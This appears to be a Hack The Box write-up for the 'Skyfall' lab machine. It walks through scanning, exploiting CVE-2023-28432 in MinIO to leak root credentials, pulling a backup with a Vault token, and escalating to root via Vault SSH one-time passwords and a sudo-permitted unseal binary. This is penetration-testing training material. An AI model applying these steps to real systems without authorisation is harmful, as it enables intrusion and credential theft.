---
title: HTB-Skyfall
draft: false
tags:
  - htb
  - linux
  - insane
---
pic here

## Information Gathering

`rustscan --addresses 10.10.11.254 --range 1-65535`

![alt text](image.png)

`sudo nmap -sVC -p 80 10.10.11.254`

![alt text](image-1.png)

## Enumeration
### HTTP - TCP 80

![alt text](image-2.png)

skyfall.htb

![alt text](image-3.png)

`sudo gobuster vhost --append-domain -u http://skyfall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

![alt text](image-4.png)

### demo.skyfall.htb
guest:guest

![alt text](image-5.png)

![alt text](image-6.png)

MinioMetrics

/metrics

![alt text](image-7.png)

`%0a`

![alt text](image-8.png)

When I scroll down the page, I come across the MinIO endpoint.

`http://prd23-s3-backend.skyfall.htb/minio/v2/metrics/cluster` /etc/hosts

![alt text](image-9.png)


### prd23-s3-backend.skyfall.htb


![alt text](image-10.png)


## Shel as askyy
### CVE-2023-28432


![alt text](image-11.png)

https://github.com/acheiii/CVE-2023-28432/

![alt text](image-12.png)

`POST /minio/bootstrap/v1/verify`

![alt text](image-13.png)

```
MINIO_ROOT_USER:5GrE1B2YGGyZzNHZaIww
MINIO_ROOT_PASSWORD:GkpjkmiVmpFuL2d3oRx0
```

### MinIO Client

**mc**** is a command-line client for **MinIO**, an open-source object storage server compatible with Amazon S3 cloud storage service.



https://min.io/docs/minio/linux/reference/minio-mc.html#id2

![alt text](image-14.png)

`mc alias set myminio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0`

![alt text](image-15.png)

`mc ls myminio`

![alt text](image-16.png)

`mc ls --recursive --versions myminio`

![alt text](image-17.png)

`mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 myminio/askyy/home_backup.tar.gz ~/Documents/htb/skyfall/home_backup.tar.gz`

![alt text](image-18.png)

### Vault

`sudo tar xzvf home_backup.tar.gz`

![alt text](image-19.png)


`.bashrc`

![alt text](image-20.png)

```
export VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="blahblah"
```

prd23-vault-internal.skyfall.htb

/etc/hosts

https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords


`wget https://releases.hashicorp.com/vault/1.15.5/vault_1.15.5_linux_amd64.zip`

`export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"`

`export VAULT_TOKEN="blahblah"`


`./vault login`

![alt text](image-21.png)

`./vault token capabilities ssh/roles`

![alt text](image-23.png)

`./vault list ssh/roles`

![alt text](image-24.png)

`./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254`

![alt text](image-22.png)

## Privesc: askyy to root
### Sudoers

`sudo -l`

![alt text](image-25.png)

`sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml`

![alt text](image-26.png)

`sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd`

![alt text](image-27.png)

![alt text](image-28.png)

![alt text](image-29.png)

![alt text](image-30.png)



sudo /root/vault/vault-unseal -c /etc/vault-unseal.yaml -vd 


### SSH as root

```
export VAULT_ADDR="http://prd23-vault-internal.skyfall.htb"
export VAULT_TOKEN="blahblah"
```

![alt text](image-31.png)

`./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254`

![alt text](image-32.png)

## References
- https://github.com/acheiii/CVE-2023-28432/
- https://min.io/docs/minio/linux/reference/minio-mc.html#id2